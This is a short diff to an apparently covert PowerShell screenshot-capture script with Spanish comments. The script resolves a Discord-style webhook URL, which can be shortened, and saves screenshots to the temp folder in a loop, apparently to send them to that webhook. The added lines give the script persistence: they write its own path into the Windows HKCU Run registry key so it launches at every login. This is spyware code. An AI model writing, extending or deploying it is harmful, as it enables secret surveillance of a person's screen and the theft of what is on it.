@@ -5,6 +5,13 @@ $a = 1 # Cantidad de capturas
 # Detección de URL acortada
 if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected......." ; $hookurl = (irm $hookurl).url}
 
+# Ubicación del script
+$scriptPath = $MyInvocation.MyCommand.Path
+
+# Agregar entrada al registro de Windows para iniciar con el sistema
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "ScreenshotScript" -Value $scriptPath
+
 do {
     $Filett = "$env:temp\SC.png"
     Add-Type -AssemblyName System.Windows.Forms
